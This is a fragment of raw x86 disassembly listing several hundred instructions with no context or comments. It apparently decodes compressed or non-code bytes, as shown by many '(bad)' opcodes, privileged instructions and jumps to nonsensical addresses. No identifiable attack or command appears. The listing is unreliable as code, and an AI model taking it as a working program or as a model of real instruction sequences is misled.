  416ead:	push   ebx
  416eae:	pop    ss
  416eaf:	dec    eax
  416eb0:	bound  ebx,QWORD PTR [ecx-0x819596b]
  416eb6:	lods   al,BYTE PTR ds:[esi]
  416eb7:	frstor [edi-0x78dc44fd]
  416ebd:	pop    ebx
  416ebe:	mov    ecx,0xd3552905
  416ec3:	push   cs
  416ec4:	enter  0xe277,0x74
  416ec8:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  416ec9:	and    al,0x25
  416ecb:	sar    dl,cl
  416ecd:	jmp    0xbc9c8291
  416ed2:	push   cs
  416ed3:	pop    eax
  416ed4:	cmp    esp,DWORD PTR [ebp+0x379f084a]
  416eda:	dec    ecx
  416edb:	or     edi,DWORD PTR [eax+0x1c]
  416ede:	outs   dx,BYTE PTR ds:[esi]
  416edf:	dec    ebp
  416ee0:	mov    ds:0x37d06e96,eax
  416ee5:	out    0x55,al
  416ee7:	dec    esp
  416ee8:	mov    ebp,eax
  416eea:	jbe    0x416f05
  416eec:	mov    dl,0x34
  416eee:	cmp    DWORD PTR [ebp+0x2fd43f81],0xffffffd1
  416ef5:	jno    0x416f59
  416ef7:	cmp    BYTE PTR [ecx],al
  416ef9:	ret    0x984a
  416efc:	and    cl,BYTE PTR [edi-0x57998909]
  416f02:	je     0x416f52
  416f04:	in     eax,dx
  416f05:	fld    DWORD PTR [eax+eax*4-0x34]
  416f09:	cdq    
  416f0a:	cmp    DWORD PTR [edx+0x22],ecx
  416f0d:	imul   esp,esp,0xffffffd9
  416f10:	xchg   edx,eax
  416f11:	cmp    BYTE PTR [ecx+0x7f490b78],cl
  416f17:	push   ds
  416f18:	mov    BYTE PTR [edi+edi*1+0x1b030fbc],ch
  416f1f:	call   0x1a828a92
  416f24:	cmp    BYTE PTR [ebp-0x65c25d2b],bl
  416f2a:	out    0x90,al
  416f2c:	push   ss
  416f2d:	jmp    0x416ed5
  416f2f:	cwde   
  416f30:	fst    QWORD PTR [ebp+esi*2-0x29b3d9da]
  416f37:	(bad)  
  416f38:	mov    BYTE PTR ds:0x1c5dc718,al
  416f3e:	inc    edx
  416f3f:	xor    esp,esp
  416f41:	add    eax,DWORD PTR [eax-0x768eda74]
  416f47:	aam    0x82
  416f49:	mov    edi,0x26e88cf7
  416f4e:	imul   ebp,DWORD PTR [ebp+0x6ce07d38],0xffffff80
  416f55:	inc    edi
  416f56:	jnp    0x416fa2
  416f58:	dec    edx
  416f59:	xor    DWORD PTR [edi],0xffffffe1
  416f5c:	ds or  eax,0xfe56f9a
  416f62:	(bad)  
  416f64:	inc    eax
  416f65:	fimul  DWORD PTR [eax-0x3f]
  416f68:	or     bl,dl
  416f6a:	xchg   edx,eax
  416f6b:	lods   eax,DWORD PTR ds:[esi]
  416f6c:	cwde   
  416f6d:	cmp    al,0xc2
  416f6f:	sbb    eax,esp
  416f71:	(bad)  
  416f72:	cmc    
  416f73:	and    BYTE PTR [ebx+0x56],cl
  416f76:	cmp    al,bh
  416f78:	mov    esi,0x14577997
  416f7d:	xchg   ebp,eax
  416f7e:	cmp    ecx,edx
  416f80:	cli    
  416f81:	arpl   WORD PTR [ecx+0x1f],bp
  416f84:	cmp    BYTE PTR [edi-0x37df8d2c],dl
  416f8a:	(bad)  
  416f8b:	dec    esi
  416f8c:	mov    edi,0x2c0d48ea
  416f91:	jge    0x416fd4
  416f93:	add    BYTE PTR [ebp-0x3d53eff3],cl
  416f99:	cmp    al,BYTE PTR [esp+edx*4+0x6e]
  416f9d:	fadd   QWORD PTR [edi]
  416f9f:	cmp    bl,BYTE PTR [ebp+0x3c]
  416fa2:	sbb    esp,DWORD PTR [esi-0x5877eb02]
  416fa8:	jns    0x417003
  416faa:	xchg   esp,eax
  416fab:	mov    dh,0x7c
  416fad:	outs   dx,DWORD PTR ds:[esi]
  416fae:	ja     0x416f9d
  416fb0:	cmp    cl,BYTE PTR [esi+eax*4]
  416fb3:	sahf   
  416fb4:	xlat   BYTE PTR ds:[ebx]
  416fb5:	push   ecx
  416fb6:	call   0xbcad:0x5804186f
  416fbd:	add    esp,0xfe5109d9
  416fc3:	retf   0xf6cd
  416fc6:	inc    eax
  416fc7:	mov    dh,0x92
  416fc9:	loope  0x416ff3
  416fcb:	sbb    DWORD PTR [ebx],ecx
  416fcd:	cwde   
  416fce:	mov    al,ds:0xd888d609
  416fd3:	mov    ch,0xfe
  416fd5:	leave  
  416fd6:	aad    0xaf
  416fd8:	push   ecx
  416fd9:	inc    edi
  416fda:	int    0x3a
  416fdc:	adc    DWORD PTR [ecx],esp
  416fde:	xchg   ecx,eax
  416fdf:	jmp    0x417009
  416fe1:	jns    0x416f8e
  416fe3:	sahf   
  416fe4:	ins    BYTE PTR es:[edi],dx
  416fe5:	jmp    0xac73:0x201c9367
  416fec:	iret   
  416fed:	xchg   ebp,eax
  416fee:	adc    al,0xf3
  416ff0:	inc    esp
  416ff1:	test   al,0x2a
  416ff3:	js     0x416fcb
  416ff5:	mov    ah,0x8f
  416ff7:	es pop edx
  416ff9:	cdq    
  416ffa:	push   ds
  416ffb:	jp     0x416fa2
  416ffd:	inc    eax
  416ffe:	xlat   BYTE PTR ds:[ebx]
  416fff:	ins    BYTE PTR es:[edi],dx
  417000:	pop    ebp
  417001:	cmp    DWORD PTR [ecx-0x4916d0f4],esp
  417007:	xor    al,BYTE PTR [ebp-0x7b1f3269]
  41700d:	jg     0x417014
  41700f:	sub    al,0x30
  417011:	idiv   DWORD PTR [ebp-0x66]
  417014:	xchg   esp,eax
  417015:	and    DWORD PTR [esi+ebp*1-0x15],esp
  417019:	retf   0xa986
  41701c:	fisub  DWORD PTR [edi-0x7b554f4c]
  417022:	push   eax
  417023:	rol    DWORD PTR [edi-0x19538305],cl
  417029:	pop    eax
  41702b:	sub    al,0x44
  41702d:	adc    DWORD PTR [edi+0x31d1b665],ebp
  417033:	push   cs
  417034:	sub    esi,DWORD PTR [ebx+0x3]
  417037:	dec    eax
  417038:	pop    eax
  417039:	nop
  41703a:	pushf  
  41703b:	jae    0x417087
  41703d:	daa    
  41703e:	jge    0x416ff6
  417040:	std    
  417041:	mov    ecx,0x9d265fc4
  417046:	js     0x41708f
  417048:	push   esp
  417049:	sbb    esi,DWORD PTR ds:0x18fc9fc9
  41704f:	retf   0xef81
  417052:	pop    ecx
  417053:	fs inc ebx
  417055:	out    dx,al
  417056:	jg     0x41702b
  417058:	mov    al,ds:0x790133af
  41705d:	sub    BYTE PTR [ebx+0x33],dh
  417060:	mov    ah,0xa8
  417062:	cmp    dh,bh
  417064:	nop
  417065:	push   ebp
  417066:	mov    ds:0x22b899a6,eax
  41706b:	add    BYTE PTR [edx-0x2c4ea099],dl
  417071:	int    0xcf
  417073:	or     DWORD PTR [edx+0x70],edx
  417076:	cmp    eax,0xabba63c
  41707b:	xor    esp,DWORD PTR [edx+0x6a]
  41707e:	mov    esp,0x8be68d79
  417083:	loop   0x4170f1
  417085:	mov    eax,0x8f43b6fe
  41708a:	and    DWORD PTR [ecx+0x16f99379],edi
  417090:	call   0xb12ec167
  417095:	jp     0x417106
  417097:	inc    ecx
  417098:	jge    0x417071
  41709a:	outs   dx,BYTE PTR ds:[esi]
  41709b:	xchg   ebx,eax
  41709c:	outs   dx,DWORD PTR ds:[esi]
  41709d:	xchg   ebp,eax
  41709e:	jbe    0x417081
  4170a0:	pop    edx
  4170a1:	dec    edi
  4170a2:	scas   eax,DWORD PTR es:[edi]
  4170a3:	or     esi,DWORD PTR [ebp+0x5427c472]
  4170a9:	and    DWORD PTR [ecx-0x26],esp
  4170ac:	adc    ebx,DWORD PTR [ebx+0x16cee058]
  4170b2:	jae    0x417065
  4170b4:	push   ds
  4170b5:	push   0x77dc1192
  4170ba:	xor    esp,esp
  4170bc:	fisttp WORD PTR [edi+0x9]
  4170bf:	and    dh,dh
  4170c1:	pop    esp
  4170c2:	sub    cl,BYTE PTR [eax-0x57]
  4170c5:	es imul esi,eax,0x34adb605
  4170cc:	push   ds
  4170cd:	fmul   QWORD PTR [eax-0x250c66f4]
  4170d3:	adc    DWORD PTR [ecx+ecx*8+0x70],edi
  4170d7:	scas   al,BYTE PTR es:[edi]
  4170d8:	sub    eax,0xcdf0fb0c
  4170dd:	push   cs
  4170de:	out    0xf2,eax
  4170e0:	jne    0x417145
  4170e2:	jae    0x41714b
  4170e4:	and    ch,BYTE PTR [edi+0x38]
  4170e7:	pop    ss
  4170e8:	mov    ecx,0x478dd774
  4170ed:	jmp    DWORD PTR [esi-0x31592056]
  4170f3:	into   
  4170f4:	sbb    BYTE PTR [ecx],al
  4170f6:	mov    gs,WORD PTR ds:0xf5b5d121
  4170fc:	mov    esp,0x7643151f
  417101:	sahf   
  417102:	inc    ebp
  417103:	jo     0x417178
  417105:	mov    esp,0xa95380e8
  41710a:	mov    eax,ds:0x1ca2ea79
  41710f:	aas    
  417110:	(bad)  
  417111:	push   edi
  417112:	inc    esp
  417113:	out    0x9c,al
  417115:	pop    ebx
  417116:	pop    ss
  417117:	pop    ebp
  417118:	xchg   edi,eax
  417119:	push   ebx
  41711a:	fwait
  41711b:	sbb    BYTE PTR [ebx],0x84
  41711e:	lock cs aad 0xb
  417122:	cmp    edx,DWORD PTR [edi-0xb6bd028]
  417128:	fisttp QWORD PTR [eax-0x7e]
  41712b:	xor    esp,DWORD PTR [ebx-0x4f94bea1]
  417131:	fist   WORD PTR [ebp-0x24]
  417134:	fcom   DWORD PTR [esi-0x77]
  417137:	fild   DWORD PTR ds:0x487f3305
  41713d:	int3   
  41713e:	or     edx,ebx
  417140:	lods   eax,DWORD PTR ds:[esi]
  417141:	inc    DWORD PTR [eax]
  417143:	cmp    bh,BYTE PTR [ebx+edx*2-0x7690d1d]
  41714a:	(bad)  
  41714b:	fwait
  41714c:	pop    es
  41714d:	sub    al,dh
  41714f:	jmp    0xd2eafc9d
  417154:	pop    esp
  417155:	je     0x417101
  417157:	int3   
  417158:	in     eax,0xa1
  41715a:	fisttp DWORD PTR [edi+0x602169eb]
  417160:	and    DWORD PTR [ebp+0x1f],0xc2674d4
  417167:	shr    BYTE PTR [ebx-0x2a380ad1],1
  41716d:	aaa    
  41716e:	jb     0x4171e8
  417170:	inc    eax
  417171:	mov    WORD PTR [eax-0x3b057739],?
  417177:	mov    ds:0xf801d941,al
  41717c:	pop    esi
  41717d:	xor    ebp,DWORD PTR [esi-0x2233ee56]
  417183:	mov    dl,bl
  417185:	shl    DWORD PTR [eax-0x48cdb40c],1
  41718b:	push   es
  41718c:	or     BYTE PTR [esi+0x61],ah
  41718f:	sub    DWORD PTR [ebp+0x23],0x95d64e6
  417196:	ins    BYTE PTR es:[edi],dx
  417197:	fidiv  WORD PTR [eax]
  417199:	(bad)  
  41719b:	imul   DWORD PTR [edi+eax*2+0x19]
  41719f:	cmp    al,0x68
  4171a1:	into   
  4171a2:	sbb    ch,0x29
  4171a5:	repz sub BYTE PTR [eax],ah
  4171a8:	das    
  4171a9:	inc    esp
  4171aa:	dec    esp
  4171ab:	jge    0x417201
  4171ad:	jnp    0x4171da
  4171af:	into   
  4171b0:	jmp    0x417211
  4171b2:	xchg   esp,eax
  4171b3:	int3   
  4171b4:	mov    dh,0xce
  4171b6:	fcmovnu st,st(7)
  4171b8:	jecxz  0x4171e2
  4171ba:	pop    edx
  4171bb:	sub    eax,0xc6dcc352
  4171c0:	nop
  4171c1:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4171c2:	mov    edi,0x4540a7d9
  4171c7:	test   eax,0x22b8cf08
  4171cc:	rcl    BYTE PTR [ecx-0x3b075b28],0xf0
  4171d3:	sbb    BYTE PTR fs:[esi],bl
  4171d6:	daa    
  4171d7:	and    cl,BYTE PTR [edx-0x277d8d92]
  4171dd:	cmp    esp,ebx
  4171df:	push   es
  4171e0:	inc    ebx
  4171e1:	stos   DWORD PTR es:[edi],eax
  4171e2:	dec    ebp
  4171e3:	hlt    
  4171e4:	jo     0x417166
  4171e6:	dec    edi
  4171e7:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4171e8:	xchg   esp,eax
  4171e9:	sub    eax,0x39850d4
  4171ee:	nop
  4171ef:	sbb    eax,0xfb753ca7
  4171f5:	jmp    0x64d0:0xcbae2116
  4171fc:	cli    
  4171fd:	add    ah,ch
  4171ff:	scas   al,BYTE PTR es:[edi]
  417200:	cmp    BYTE PTR ds:0x20c64018,0x2c
  417207:	not    BYTE PTR [eax-0x6a31931e]
  41720d:	add    al,0xa7
  41720f:	lock add eax,0x36f62c27
  417215:	adc    eax,0xf33936bd
  41721a:	xchg   esi,eax
  41721b:	mov    BYTE PTR [edi+0x7b57f183],bl
  417221:	les    ebx,FWORD PTR [ebx]
  417223:	mov    eax,0xb7dfc651
  417228:	call   0xdf3d:0x591f18f8
  41722f:	or     BYTE PTR [ebx-0x71875fd6],dl
  417235:	dec    esi
  417236:	fisttp DWORD PTR [ebx-0x32]
  417239:	data16 out 0x31,al
  41723c:	jbe    0x4171ec
  41723e:	stos   BYTE PTR es:[edi],al
  41723f:	pusha  
  417240:	inc    eax
  417241:	(bad)  
  417242:	adc    al,0xa5
  417244:	push   esp
  417245:	bound  edx,QWORD PTR [esi-0x5e]
  417248:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  417249:	loopne 0x417283
  41724b:	aam    0x9e
  41724d:	jmp    0x417225
  41724f:	scas   al,BYTE PTR es:[edi]
  417250:	les    edi,FWORD PTR [eax+0x1f]
  417253:	or     ecx,ebx
  417255:	popa   
  417256:	loope  0x41725f
  417258:	inc    DWORD PTR [ebp+0x234931bc]
  41725e:	sti    
  41725f:	rol    bl,0x21
  417262:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  417263:	cmp    al,0x6e
  417265:	adc    ecx,DWORD PTR [esi]
  417267:	pop    es
  417268:	xor    bh,BYTE PTR [edx]
  41726a:	mov    ebp,0x7c27fa2b
  41726f:	push   es
  417270:	js     0x4172bd
  417272:	sahf   
  417273:	mov    ds,WORD PTR [eiz*2-0x53f39818]
  41727a:	mov    dl,0xd
  41727c:	jmp    0x52ed:0xaa18d75
  417283:	mov    ds:0x2510e783,eax
  417288:	mov    ch,0x8d
  41728a:	mov    esp,esp
  41728c:	rcr    BYTE PTR [ecx-0x196ba9ea],cl
  417292:	mov    DWORD PTR [ebx],0x2c80afca
  417298:	fbld   TBYTE PTR [ecx+0x20e45a63]
  41729f:	pop    ecx
  4172a0:	ins    DWORD PTR es:[edi],dx
  4172a1:	mov    ah,BYTE PTR [edi]
  4172a3:	pop    ebx
  4172a4:	sbb    bl,BYTE PTR [esi+0x6f]
  4172a7:	call   esi
  4172a9:	je     0x4172c8
  4172ab:	cmp    bl,cl
  4172ad:	imul   ecx,DWORD PTR [ebp-0x31],0xb1d9e34b
  4172b4:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4172b5:	cmc    
  4172b6:	jp     0x41731f
  4172b8:	dec    eax
  4172b9:	jae    0x417285
  4172bb:	jecxz  0x4172cb
  4172bd:	rcr    DWORD PTR [edx+0x0],0x70
  4172c1:	pop    esi
  4172c2:	mov    bl,0x1d
  4172c4:	or     DWORD PTR [ebx-0x5a],ebp
  4172c7:	xor    edi,DWORD PTR [ebp-0x754ed3d4]
  4172cd:	pop    esi
  4172ce:	loopne 0x4172f3
  4172d0:	jmp    0x4172b4
  4172d2:	xchg   edx,eax
  4172d3:	push   ecx
  4172d4:	out    0x9b,al
  4172d6:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4172d7:	inc    edx
  4172d8:	shl    BYTE PTR [ecx+0x46],1
  4172db:	mov    ebx,0x55f068a3
  4172e0:	scas   al,BYTE PTR es:[edi]
  4172e1:	fld    DWORD PTR [esi]
  4172e3:	sahf   
  4172e4:	lods   eax,DWORD PTR ds:[esi]
  4172e5:	sub    esp,DWORD PTR [ecx+ebx*2]
  4172e8:	pop    edx
  4172e9:	add    al,0xb4
  4172eb:	sub    cl,BYTE PTR [ebp+0xb]
  4172ee:	add    edi,DWORD PTR [esi+ecx*1+0x1f274d9b]
  4172f5:	jno    0x4172de
  4172f7:	mov    cl,0xd3
  4172f9:	push   cs
  4172fa:	repnz ss iret 
  4172fd:	lods   eax,DWORD PTR ds:[esi]
  4172fe:	mov    ds:0xd437479b,al
  417303:	hlt    
  417304:	add    dh,BYTE PTR [esi]
  417306:	jno    0x41729c
  417308:	sub    eax,0xedc8e0be
  41730d:	or     BYTE PTR [ecx+0x7c79ecaf],dh
  417313:	xor    cl,0xbe
  417316:	cmp    dl,BYTE PTR [ecx+0x32d47e79]
  41731c:	mov    ebp,0xe9e37f34
  417321:	sbb    DWORD PTR [edi+0x57],ebx
  417324:	add    al,0xd5
  417326:	nop
  417327:	and    dh,ch
  417329:	xchg   esi,eax
  41732a:	mov    edx,0x6ad3d3ef
  41732f:	dec    ecx
  417330:	xchg   ebx,eax
  417331:	mov    ebp,0xb487e131
  417336:	or     bl,al
  417338:	mov    cl,0x92
  41733a:	inc    edi
  41733b:	es push es
  41733d:	and    al,0xf3
  41733f:	or     bl,BYTE PTR [ecx+eiz*2]
  417342:	jge    0x4173a6
  417344:	aad    0xd4
  417346:	ja     0x41738c
  417348:	lods   al,BYTE PTR ds:[esi]
  417349:	pusha  
  41734a:	sub    edi,DWORD PTR [ecx+0x3ab2247c]
  417350:	add    edi,DWORD PTR [edx+0x6376b5d0]
  417356:	or     DWORD PTR [ebx+0x4003530],ecx
  41735c:	cmp    DWORD PTR [edi+0x55c343ba],ebp
  417362:	jo     0x417357
  417364:	icebp  
  417365:	push   ebp
  417366:	mov    ch,0x7
  417368:	aaa    
  417369:	gs js  0x417310
  41736c:	arpl   WORD PTR [edi-0x10ad325e],cx
  417372:	cmp    DWORD PTR [ecx],ebx
  417374:	jbe    0x417348
  417376:	and    esi,ebx
  417378:	adc    al,0x9
  41737a:	pop    edi
  41737b:	mov    ch,BYTE PTR [edi+0x47]
  41737e:	pop    ss
  41737f:	mov    DWORD PTR [edi],ebp
  417381:	add    al,0xda
  417383:	push   ds
  417384:	mov    DWORD PTR [edi+0x54c0e1],esi
  41738a:	ret    
  41738b:	push   esp
  41738d:	add    al,bh
  41738f:	mov    al,0x18
  417391:	scas   eax,DWORD PTR es:[edi]
  417392:	shl    DWORD PTR [edi],cl
  417394:	call   0xb129071
  417399:	mov    ecx,0x96eda114
  41739e:	and    al,0x50
  4173a0:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4173a1:	dec    ecx
  4173a2:	inc    edi
  4173a3:	nop
  4173a4:	xchg   esi,eax
  4173a5:	inc    ebp
  4173a6:	sbb    BYTE PTR [esi],bh
  4173a8:	outs   dx,BYTE PTR ds:[esi]
  4173a9:	fwait
  4173aa:	out    dx,eax
  4173ab:	jecxz  0x417385
  4173ad:	loope  0x4173b1
  4173af:	mov    ah,0x8b
  4173b1:	loop   0x417338
  4173b3:	out    0x0,al
  4173b5:	hlt    
  4173b6:	mov    DWORD PTR [edi],esi
  4173b8:	mov    eax,ds:0xd4657924
  4173bd:	js     0x417343
  4173bf:	push   0xffffffcb
  4173c1:	lods   eax,DWORD PTR ds:[esi]
  4173c2:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4173c3:	or     eax,0x85ffc0a9
  4173c8:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4173c9:	adc    eax,0xec15e77e
  4173ce:	rol    DWORD PTR [ebx+0x6b],1
  4173d1:	jne    0x41736a
  4173d3:	jmp    0x417401
  4173d5:	inc    edx
  4173d6:	pop    esi
  4173d7:	retf   0x6791
  4173da:	jno    0x417362
  4173dc:	ret    
  4173dd:	xor    eax,0xd0d707a3
  4173e2:	mov    al,ds:0x54117d7c
  4173e7:	pop    esi
  4173e8:	cwde   
  4173e9:	push   ecx
  4173ea:	push   ebx
  4173eb:	gs loop 0x4173a8
  4173ee:	jl     0x417431
  4173f0:	inc    esp
  4173f1:	add    eax,0xf7ea37f9
  4173f6:	push   esi
  4173f7:	xlat   BYTE PTR ds:[ebx]
  4173f8:	fbld   TBYTE PTR [ebx]
  4173fa:	sub    DWORD PTR [ebx-0x2e],0x61
  4173fe:	(bad)  
  4173ff:	mov    dh,0x20
  417401:	daa    
  417402:	jnp    0x4173a3
  417404:	sbb    edi,DWORD PTR [edi-0x68]
  417407:	loop   0x4173a0
  417409:	ficom  WORD PTR [ebx]
  41740b:	cmc    
  41740c:	imul   ebp,esp,0x36
  41740f:	shr    DWORD PTR [ebp-0x694f9d4c],cl
  417415:	mov    bh,0xc1
  417417:	pop    esp
  417418:	and    DWORD PTR [edi-0x1582025a],edi
  41741e:	dec    edx
  41741f:	add    bl,ch
  417421:	cli    
  417422:	icebp  
  417423:	push   edx
  417424:	sub    eax,DWORD PTR [eax]
  417426:	sar    DWORD PTR [ebp*2+0x7a1dce89],0xa2
  41742e:	das    
  41742f:	in     eax,dx
  417430:	and    ah,BYTE PTR [esi+eax*8-0x58]
  417434:	mov    cl,0xc8
  417436:	inc    ecx
  417437:	je     0x417491
  417439:	mov    ah,0x60
  41743b:	mov    cl,0x6c
  41743d:	mov    al,0x73
  41743f:	dec    ebx
  417440:	push   esp
  417441:	adc    BYTE PTR [eax+esi*4+0x32022160],al
  417448:	ret    
  417449:	fs and eax,0x95a7387e
  41744f:	call   0xb0751e6f
  417454:	push   ebx
  417455:	jmp    0x2f3ae5e7
  41745a:	sar    BYTE PTR [edi+0x1e880a01],cl
  417460:	lods   eax,DWORD PTR ds:[esi]
  417461:	ds inc esi
  417463:	(bad)  
  417464:	mov    bl,0xca
  417466:	or     al,0x12
  417468:	mov    al,0x37
  41746a:	test   dh,ch
  41746c:	in     eax,0xaa
  41746e:	ins    DWORD PTR es:[edi],dx
  41746f:	or     ebp,DWORD PTR [ebx+0x3308567b]
  417475:	addr16 jl 0x41743f
  417478:	in     eax,0x6a
  41747a:	mov    al,0xe5
  41747c:	jne    0x4174ef
  41747e:	jne    0x417446
  417480:	loopne 0x41748a
  417482:	(bad)  
  417483:	ror    DWORD PTR [ebp-0x58e8620e],0x3b
  41748a:	test   DWORD PTR [esi-0x7f],edx
  41748d:	push   ds
  41748e:	outs   dx,BYTE PTR ds:[esi]
  41748f:	inc    esi
  417490:	sbb    BYTE PTR [ebx-0x8b5d1f4],bh
  417496:	add    edi,eax
  417498:	les    edx,FWORD PTR [ecx-0x7f]
  41749b:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41749c:	hlt    
  41749d:	and    al,0x24
  41749f:	jne    0x4174f3
  4174a1:	scas   al,BYTE PTR es:[edi]
  4174a2:	dec    edx
  4174a3:	icebp  
  4174a4:	loope  0x417503
  4174a6:	inc    eax
  4174a7:	push   ss
  4174a8:	cmc    
  4174a9:	or     esp,eax
  4174ab:	pusha  
  4174ac:	stc    
  4174ad:	push   edi
  4174ae:	imul   esi,eax,0x4ce27232
  4174b4:	adc    edi,0x11993ca8
  4174ba:	(bad)  
  4174bb:	xchg   ecx,eax
  4174bc:	xor    ebp,ebp
  4174be:	pop    es
  4174bf:	or     bh,BYTE PTR [edx-0x31]
  4174c2:	ret    
  4174c3:	and    eax,0x2fb56a40
  4174c8:	ins    BYTE PTR es:[edi],dx
  4174c9:	std    
  4174ca:	addr16 mov dh,0xec
  4174cd:	ins    BYTE PTR es:[edi],dx
  4174ce:	jg     0x417474
  4174d0:	pushf  
  4174d1:	outs   dx,BYTE PTR ss:[esi]
  4174d3:	jbe    0x417513
  4174d5:	test   DWORD PTR [edx+0x56b8f1ed],edx
  4174db:	cmp    BYTE PTR [edx+0x4],cl
  4174de:	pushf  
  4174df:	mov    eax,0xb7f447ee
  4174e4:	(bad)  
  4174e5:	jnp    0x417504
  4174e7:	push   0x3c
  4174e9:	mov    edi,0x8a845b9
  4174ee:	fadd   st(1),st
  4174f0:	xchg   edi,eax
  4174f1:	push   0xfffffffe
  4174f3:	mov    dh,0xbc
  4174f5:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4174f6:	mov    bl,0x43
  4174f8:	mov    ds:0x70ca43f7,eax
  4174fd:	adc    ebx,ebp
  4174ff:	mov    ecx,0x792a2b8c
  417504:	imul   edx,DWORD PTR [edx+0x2155f2f7],0xffffffe3
  41750b:	push   ds
  41750c:	fcomp  DWORD PTR ds:0xfb16c734
  417512:	out    0x77,al
  417514:	mov    esp,edx
  417516:	shl    DWORD PTR [ebx+edx*1+0x6c8cc9ac],0xfa
  41751e:	xor    al,0x46
  417520:	outs   dx,DWORD PTR ds:[esi]
  417521:	sbb    BYTE PTR [ecx],0x9c
  417524:	mov    ds:0x4c00541c,al
  417529:	add    al,0x39
  41752b:	inc    ebp
  41752c:	fist   DWORD PTR [esi]
  41752e:	(bad)  
  41752f:	js     0x4174e4
  417531:	and    ecx,ebp
  417533:	and    BYTE PTR cs:[ebp-0x1fbd71be],0x7e
  41753b:	or     BYTE PTR [esi],cl
  41753d:	dec    esp
  41753e:	and    bh,BYTE PTR ds:0xa0a7de6f
  417544:	popf   
  417545:	adc    BYTE PTR [eax+0x65],0xd
  417549:	mov    al,0x2c
  41754b:	test   eax,0x6b393553
  417550:	mov    ds:0x850f5228,al
  417555:	pop    ss
  417556:	hlt    
  417557:	sub    DWORD PTR [ecx],edi
  417559:	and    eax,0x3bd849d6
  41755e:	test   eax,0x4558936a
  417563:	mov    WORD PTR [eax+0x9],?
  417566:	mov    ebp,0x547f9fb8
  41756b:	fwait
  41756c:	inc    esi
  41756d:	mov    ebx,0xfa2e96bc
  417572:	sub    BYTE PTR [edx+0x2b0cc7c],bl
  417578:	leave  
  417579:	lods   eax,DWORD PTR ds:[esi]
  41757a:	mov    eax,0x8e93df6a
  41757f:	nop
  417580:	cmc    
  417581:	cwde   
  417582:	ins    BYTE PTR es:[edi],dx
  417583:	dec    ebx
  417584:	inc    edi
  417585:	inc    ebx
  417586:	repz sti 
  417588:	fimul  WORD PTR [eax-0x20]
  41758b:	(bad)  
  41758c:	jecxz  0x4175aa
  41758e:	popf   
  41758f:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  417590:	shl    BYTE PTR [ecx-0x2667f970],1
  417596:	or     BYTE PTR [edi+0x34],bh
  417599:	shl    dh,1
  41759b:	mov    cr4,esi
  41759e:	jne    0x417564
  4175a0:	test   DWORD PTR [ebx],esi
  4175a2:	push   ebp
  4175a3:	arpl   WORD PTR [edi-0x4d],bp
  4175a6:	in     eax,0xc9
  4175a8:	jo     0x4175f5
  4175aa:	dec    edi
  4175ab:	cdq    
  4175ac:	(bad)  
  4175ad:	and    DWORD PTR [edi+0x5123de1e],edi
  4175b3:	mov    BYTE PTR [esi-0x3e],cl
  4175b6:	push   esi
  4175b7:	xchg   edx,eax
  4175b8:	sbb    ebx,DWORD PTR [edi-0x32da38ca]
  4175be:	pop    ss
  4175bf:	lods   eax,DWORD PTR ds:[esi]
  4175c0:	shr    BYTE PTR [ecx],cl
  4175c2:	aam    0x34
  4175c4:	xchg   BYTE PTR [edi],dl
  4175c6:	sub    DWORD PTR [ecx+edi*8-0x42],0x588c9140
  4175ce:	loop   0x4175b2
  4175d0:	cmp    ebx,ebx
  4175d2:	fwait
  4175d3:	xchg   edi,eax
  4175d4:	nop
  4175d5:	in     eax,0xda
  4175d7:	daa    
  4175d8:	test   al,0x87
  4175da:	push   es
  4175db:	xchg   edi,eax
  4175dc:	(bad)  
  4175dd:	outs   dx,BYTE PTR ds:[esi]
  4175de:	adc    BYTE PTR [eax+eiz*4+0x64],dl
  4175e2:	(bad)  
  4175e3:	ret    
  4175e4:	das    
  4175e5:	xor    cl,BYTE PTR ds:0x627946f0
  4175eb:	push   cs
  4175ec:	shl    BYTE PTR [esi+0x5e],cl
  4175ef:	dec    ecx
  4175f0:	imul   ebp,DWORD PTR ss:[eax+0x37],0x3ed3dbec
  4175f8:	clc    
  4175f9:	bound  edi,QWORD PTR [edi+0x2c]
  4175fc:	push   0x6a628da
  417601:	pop    ebx
  417602:	fwait
  417603:	sub    BYTE PTR [ebx],bh
  417605:	mov    bh,0x25
  417607:	and    al,0x6d
  417609:	js     0x4175e2
  41760b:	jle    0x41758f
  41760d:	push   esp
  41760e:	mov    dh,al
  417610:	dec    ecx
  417611:	pop    esp
  417612:	mov    ebp,0x1ed50359
  417617:	mov    bh,0xbd
  417619:	xor    al,0x8e
  41761b:	out    dx,eax
  41761c:	inc    eax
  41761d:	jo     0x41761a
  41761f:	sahf   
  417620:	xlat   BYTE PTR ds:[ebx]
  417621:	enter  0x80ba,0x42
  417625:	rcl    BYTE PTR [ecx-0x78cac5ad],0xd9
  41762c:	lahf   
  41762d:	pop    ds
  41762e:	das    
  41762f:	pop    edx
  417630:	mov    ebx,0x63aac58c
  417635:	or     al,0x23
  417637:	xchg   ebp,eax
  417638:	fstp   TBYTE PTR [ecx-0x886f0ef]
  41763e:	ficomp DWORD PTR [ebp-0x4e]
  417641:	push   esi
  417642:	push   ds
  417643:	mov    ch,0xec
  417645:	add    ah,BYTE PTR [eax+0x5550cd63]
  41764b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41764c:	(bad)  
  41764d:	repz add eax,0x1c0a24d3
  417653:	repnz and DWORD PTR [esi-0x29e79aef],ebx
  41765a:	mov    eax,0x5cd62574
  41765f:	sbb    al,0x2d
  417661:	shr    esp,cl
  417663:	adc    eax,0x5110b52f
  417668:	hlt    
  417669:	and    eax,0xe44ed38b
  41766e:	iret   
  41766f:	addr16 test ax,0x42a8
  417674:	loop   0x417622
  417676:	mov    ebx,0xfe239308
  41767b:	adc    edi,DWORD PTR ds:0xdfdfa81b
  417681:	or     edi,eax
  417683:	jmp    0x41762f
  417685:	adc    eax,0x126044e
